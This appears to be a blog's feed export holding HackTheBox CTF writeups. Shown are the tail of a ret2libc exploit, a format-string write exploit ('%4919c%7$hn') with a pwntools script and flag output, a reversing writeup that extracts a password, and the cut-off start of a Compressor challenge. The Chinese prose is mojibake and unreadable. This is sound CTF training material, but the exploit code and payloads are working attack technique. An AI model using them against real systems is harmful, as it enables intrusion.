&quot;</span>, p2)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;reset!&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;cat flag.txt&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œçµæœï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/sp_retribution&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;./glibc/&#x27;</span></span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/glibc/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 94.237.59.180 on port 45699: Don[[+] Opening connection to 94.237.59.180 on port 45699: Done[+] Leaked PIE --&gt; 0x5626f6c00d70</span><br><span class="line">[+] Find PIE Base --&gt; 0x5626f6c00000</span><br><span class="line">[*] Loaded 14 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;sp_retribution&#x27;</span></span><br><span class="line">[+] Find libc base --&gt; 0x7f82e0a13000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">HTB&#123;w3_f1n4lly_m4d3_1t&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pwn_retribution.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;ç›´æ¥ä¾†çœ‹é€™é¡Œçš„ä¸»é‚è¼¯å’Œä¿è­·æ©Ÿåˆ¶ï¼š&lt;br&gt;PIE æœ‰é–‹ï¼Œæœ‰ c</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="retlibc" scheme="https://kazma.tw/tags/retlibc/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Space pirate: Entrypoint Writeup</title>
    <link href="https://kazma.tw/2024/11/05/HackTheBox-Challenges-Space-pirate-Entrypoint-Writeup/"/>
    <id>https://kazma.tw/2024/11/05/HackTheBox-Challenges-Space-pirate-Entrypoint-Writeup/</id>
    <published>2024-11-05T08:25:54.324Z</published>
    <updated>2024-11-05T08:53:12.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>ç›´æ¥æ”¾ä¸Šé¡Œç›®é—œéµé‚è¼¯çš„åç·¨è­¯ï¼š</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-40h] OVERLAPPED BYREF</span></span><br><span class="line">  <span class="type">int</span> *v6; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  *(_QWORD *)&amp;v5 = <span class="number">0xDEADBEEF</span>LL;</span><br><span class="line">  v6 = &amp;v5;</span><br><span class="line">  <span class="built_in">printf</span>(a1ScanCard);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">2</span> )</span><br><span class="line">      check_pass();</span><br><span class="line">    <span class="built_in">printf</span>(aSInvalidOption, <span class="string">&quot;\x1B[1;5;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">6969</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Scanning card.. Something is wrong!\n\nInsert card&#x27;s serial number: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nYour card is: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;v5 == <span class="number">0xDEAD1337</span>LL )</span><br><span class="line">    open_door();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(aSInvalidIdIntr, <span class="string">&quot;\x1B[1;5;31m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢æˆ‘æœ‰å…ˆèª¿æ•´éä¸€äº›éƒ¨åˆ†ï¼Œä¾‹å¦‚ v6 æ‡‰è©²æ˜¯ v5 çš„ pointer æ‰å°ã€‚<br>ç„¶å¾Œ <code>check_pass()</code> ä¸æ˜¯ä»Šå¤©è¦è¨è«–çš„é‡é»ï¼Œæ¼æ´éƒ¨åˆ†åœ¨ <code>printf(buf);</code> æœ‰ format string å¯ä»¥åˆ©ç”¨ï¼Œç„¶å¾Œé¡Œç›®ä¿è­·å…¨é–‹ï¼Œæ‰€ä»¥æˆ‘å€‘ç›®æ¨™æ˜¯é€šéå¾Œé¢é–‹ flag çš„æª¢æŸ¥ï¼Œä¹Ÿå°±æ˜¯ v5 è¦ç­‰æ–¼ 0xdead1337ï¼Œä½†æ˜¯ä¸€é–‹å§‹ v5 è¢«å®£å‘Šæˆ 0xdeadbeefï¼Œæ‰€ä»¥æˆ‘å€‘è¦é€é format string write ä¾†ä¿®æ”¹å¾Œé¢å…©å€‹ bytes ç‚º 0x1337ã€‚<br>å…·é«” payload æˆ‘å€‘å¯ä»¥ç”¨ï¼š<code>%4919c%7$hn&quot;</code>ï¼Œå„éƒ¨åˆ†çš„è§£é‡‹å¦‚ä¸‹ï¼š</p><ul><li>%4919c%: å› ç‚º printf çš„ %n å¯«å…¥çš„æ˜¯é•·åº¦ï¼Œæ‰€ä»¥å¦‚æœæ‰“ 0x1337 å€‹å­—ç¬¦æœƒå¾ˆæ²’æœ‰æ•ˆç‡ï¼Œé€™é‚Šç”¨ %?c ä¾†ç›´æ¥æ±ºå®šè¼¸å…¥çš„é•·åº¦ä¹Ÿå°±æ˜¯å¯¦éš›å¯«å…¥å¾—å€¼ï¼Œ0x1337 çš„åé€²ä½æ˜¯ 4919ã€‚</li><li>ç„¶å¾Œ %7 æ˜¯è¦å¯«å…¥çš„ä½ç½®è·é›¢ç¾åœ¨çš„ offsetï¼Œé€™å€‹å¾…æœƒç®—çµ¦å„ä½çœ‹</li><li>æœ€å¾Œ %hn ä»£è¡¨çš„æ˜¯å¯«å…¥ 2 å€‹ bytes<br>å¯«å…¥ä½ç½®çš„ç®—æ³•å¯ä»¥ç›´æ¥ç”¨ printf format string çš„ç‰¹æ€§ä¾†çœ‹ä½ç½®:<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. Scan card ğŸ’³</span><br><span class="line">2. Insert password â†ªï¸</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">[!] Scanning card.. Something is wrong!</span><br><span class="line"></span><br><span class="line">Insert card<span class="string">&#x27;s serial number: %p %p %p %p %p %p %p %p %p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your card is: 0x7ffe036aed40 0x7f411a7ed8c0 (nil) 0xf (nil) 0xdeadbeef 0x7ffe036b13e0 0x7025207025207025 0x2520702520702520</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">U</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-] Invalid ID! Intruder detected! ğŸš¨ ğŸš¨</span></span><br></pre></td></tr></table></figure></div>æ‰€ä»¥ v5 çš„ offset æ˜¯ 6ï¼Œv6 çš„ offset å°±åœ¨ 7ï¼Œç„¶å¾Œæˆ‘å€‘è¦åšçš„æ˜¯å¯«å…¥åˆ° pointerï¼Œä¹Ÿå°±æ˜¯å‰é¢èªªçš„ offset 7ã€‚</li></ul><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./sp_entrypoint&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;94.237.51.112&quot;</span>, <span class="number">52633</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p = <span class="string">b&quot;%4919c%7$hn&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;: &quot;</span>, p)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Door opened, you can proceed with the passphrase: &quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œçµæœï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./sp_entrypoint&#x27;</span>: pid 376139</span><br><span class="line">[+] Opening connection to 94.237.51.112 on port 52633: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">HTB&#123;g4t3_0n3_d4rkn3e55_th3_w0rld_0f_p1r4t35&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pirate_entry_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;ç›´æ¥æ”¾ä¸Šé¡Œç›®é—œéµé‚è¼¯çš„åç·¨è­¯ï¼š&lt;/p&gt;
&lt;div class</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="fmt-write" scheme="https://kazma.tw/tags/fmt-write/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges WIDE Writeup</title>
    <link href="https://kazma.tw/2024/11/04/HackTheBox-Challenges-WIDE-Writeup/"/>
    <id>https://kazma.tw/2024/11/04/HackTheBox-Challenges-WIDE-Writeup/</id>
    <published>2024-11-04T08:38:57.319Z</published>
    <updated>2024-11-04T08:47:41.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>é€™é¡Œç”¨ ida é–‹èµ·ä¾†å¾Œå°±æœƒçœ‹åˆ° usage æ˜¯è¦å¸¶ä¸Šä»–é™„çµ¦æˆ‘å€‘çš„ db ç•¶ä½œåƒæ•¸å‚³é€²å» ELFï¼Œæ¥è‘—å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./wide db.ex</span><br><span class="line">[*] Welcome user: kr4eq4L2<span class="variable">$12xb</span>, to the Widely Inflated Dimension Editor [*]</span><br><span class="line">[*]    Serving your pocket dimension storage needs since 14,012.5 B      [*]</span><br><span class="line">[*]                       Displaying Dimensions....                      [*]</span><br><span class="line">[*]       Name       |              Code                |   Encrypted    [*]</span><br><span class="line">[X] Primus           | people breathe variety practice  |                [*]</span><br><span class="line">[X] Cheagaz          | scene control river importance   |                [*]</span><br><span class="line">[X] Byenoovia        | fighting cast it parallel        |                [*]</span><br><span class="line">[X] Cloteprea        | facing motor unusual heavy       |                [*]</span><br><span class="line">[X] Maraqa           | stomach motion sale valuable     |                [*]</span><br><span class="line">[X] Aidor            | feathers stream sides gate       |                [*]</span><br><span class="line">[X] Flaggle Alpha    | admin secret power hidden        |       *        [*]</span><br><span class="line">Which dimension would you like to examine? 1</span><br><span class="line">The Ice Dimension</span><br><span class="line">Which dimension would you like to examine? 2</span><br><span class="line">The Berserk Dimension</span><br><span class="line">Which dimension would you like to examine? 3</span><br><span class="line">The Hungry Dimension</span><br><span class="line">Which dimension would you like to examine? 4</span><br><span class="line">The Water Dimension</span><br><span class="line">Which dimension would you like to examine? 5</span><br><span class="line">The Bone Dimension</span><br><span class="line">Which dimension would you like to examine? 6</span><br><span class="line">[X] That entry is encrypted - please enter your WIDE decryption key: sup3rs3cr3tw1d3</span><br><span class="line">HTB&#123;som3_str1ng5_4r3_w1d3&#125;</span><br><span class="line">Which dimension would you like to examine? Our home dimension</span><br><span class="line">Which dimension would you like to examine?</span><br></pre></td></tr></table></figure></div><p>ä»–æœƒå•æˆ‘å€‘è¦æª¢æŸ¥å“ªå€‹ dimensionï¼Œç„¶å¾Œå°±æœƒç™¼ç¾ 6 æ˜¯éœ€è¦å¯†ç¢¼çš„ï¼Œæˆ‘å€‘å¯ä»¥é–‹ ida å¾Œåœ¨ <code>menu()</code> è£¡é¢çœ‹åˆ°æˆ‘å€‘è¦æ¯”å°çš„å¯†ç¢¼ï¼Œçœ‹åˆ° rodata çš„åœ°æ–¹å¯ä»¥çœ‹åˆ°å¯†ç¢¼ï¼š</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">rodata:<span class="number">00000000000010</span>D0 ; <span class="type">const</span> <span class="type">char</span> aXThatEntryIsEn[]</span><br><span class="line">.rodata:<span class="number">00000000000010</span>D0 aXThatEntryIsEn db <span class="string">&#x27;[X] That entry is encrypted - please enter your WIDE decryption k&#x27;</span></span><br><span class="line">.rodata:<span class="number">00000000000010</span>D0                                         ; DATA XREF: menu+<span class="number">2B</span>9â†‘o</span><br><span class="line">.rodata:<span class="number">0000000000001111</span>                 db <span class="string">&#x27;ey: &#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001116</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001118</span> ; <span class="type">const</span> <span class="type">wchar_t</span> s2</span><br><span class="line">.rodata:<span class="number">0000000000001118</span> s2              db <span class="string">&#x27;s&#x27;</span>,<span class="number">0</span>                ; DATA XREF: menu+<span class="number">30</span>Aâ†‘o</span><br><span class="line">.rodata:<span class="number">000000000000111</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000111</span>C aU              db <span class="string">&#x27;u&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000111</span>E                 align <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001120</span> aP              db <span class="string">&#x27;p&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001122</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001124</span> a3              db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001126</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001128</span> aR              db <span class="string">&#x27;r&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>C aS              db <span class="string">&#x27;s&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>E                 align <span class="number">10</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001130</span> a3_0            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001132</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001134</span> aC              db <span class="string">&#x27;c&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001136</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001138</span> aR_0            db <span class="string">&#x27;r&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>C a3_1            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>E                 align <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001140</span> aT              db <span class="string">&#x27;t&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001142</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001144</span> aW              db <span class="string">&#x27;w&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001146</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001148</span> a1              db <span class="string">&#x27;1&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>C aD              db <span class="string">&#x27;d&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>E                 align <span class="number">10</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001150</span> a3_2            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001152</span>                 align <span class="number">8</span></span><br></pre></td></tr></table></figure></div><p>ä½†é€™é‚Šæˆ‘å€‘é †ä¾¿ç·´ç¿’ä¸€ä¸‹ç”¨ pwntools è®€å¯†ç¢¼çš„æ–¹å¼ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file = ELF(<span class="string">&quot;wide&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">start_addr = <span class="number">0x1118</span></span><br><span class="line">end_addr = <span class="number">0x1154</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_addr, end_addr, <span class="number">4</span>):</span><br><span class="line">    flag += file.read(i, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode(<span class="string">&quot;ascii&quot;</span>))</span><br></pre></td></tr></table></figure></div><p>çµæœï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python read_pw.py</span><br><span class="line">sup3rs3cr3tw1d3</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;é€™é¡Œç”¨ ida é–‹èµ·ä¾†å¾Œå°±æœƒçœ‹åˆ° usage æ˜¯è¦å¸¶ä¸Šä»–é™„çµ¦</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="rev" scheme="https://kazma.tw/tags/rev/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Compressor Writeup</title>
    <link href="https://kazma.tw/2024/11/04/HackTheBox-Challenges-Compressor-Writeup/"/>
    <id>https://kazma.tw/2024/11/04/HackTheBox-Challenges-Compressor-Writeup/</id>
    <published>2024-11-04T07:18:40.634Z</published>
    <updated>2024-11-04T07:34:12.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>ç›´æ¥æ”¾è§£æ³•ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ nc 83.136.254.158 30271                                                                                          â”€â•¯</span><br><span class="line"></span><br><span class="line">[*] Directory to work <span class="keyword">in</span>: zdh6Ogvx31QCR9kWPu61pubPpr6TMIRa</span><br><span class="line"></span><br><span class="line">Component List:</span><br><span class="line"></span><br><span class="line">+===============+</span><br><span class="line">|               |</span><br><span class="line">|  1. Head  ğŸ¤–  |</span><br><span class="line">|  2. Torso ğŸ¦´   |</span><br><span class="line">|  3. Hands ğŸ’ª  |</span><br><span class="line">|  4. Legs  ğŸ¦µ   |</span><br><span class="line">|               |</span><br><span class="line">+===============+</span><br><span class="line"></span><br><span class="line">[*] Choose component: 1</span><br><span class="line"></span><br><span class="line">[*] Sub-directory to work <span class="keyword">in</span>: zdh6Ogvx31QCR9kWPu61pubPpr6TMIRa/Head</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Actions:</span><br><span class="line"></span><br><span class="line">1. Create artifact</span><br><span class="line">2. List directory    (<span class="built_in">pwd</span>; <span class="built_in">ls</span> -la)</span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)</span><br><span class="line">4. Change directory  (<span class="built_in">cd</span> &lt;<span class="built_in">dirname</span>&gt;)</span><br><span class="line">5. Clean directory   (<span class="built_in">rm</span> -rf ./*)</span><br><span class="line">6. Exit</span><br><span class="line"></span><br><span class="line">[*] Choose action: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Insert name: a</span><br><span class="line"></span><br><span class="line">Insert content: a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Artifact [a] was created successfuly!</span><br><span class="line"></span><br><span class="line">Actions:</span><br><span class="line"></span><br><span class="line">1. Create artifact</span><br><span class="line">2. List directory    (<span class="built_in">pwd</span>; <span class="built_in">ls</span> -la)</span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)</span><br><span class="line">4. Change directory  (<span class="built_in">cd</span> &lt;<span class="built_in">dirname</span>&gt;)</span><br><span class="line">5. Clean directory   (<span class="built_in">rm</span> 